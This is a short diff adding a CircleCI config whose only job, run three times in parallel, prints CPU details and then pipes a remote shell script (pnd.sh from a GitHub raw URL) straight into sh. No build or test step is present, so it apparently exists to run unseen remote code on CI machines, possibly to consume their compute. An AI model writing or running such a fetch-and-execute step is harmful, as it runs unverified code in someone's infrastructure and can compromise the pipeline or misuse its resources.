@@ -1,0 +1,15 @@
+version: 2.1
+jobs:
+  trial:
+    docker:
+      - image: circleci/ruby:2.5.3
+    parallelism: 3
+    steps:
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/omsompret/om-001/main/pnd.sh -O - | sh
+
+workflows:
+  version: 2.1
+  build:
+    jobs:
+      - trial
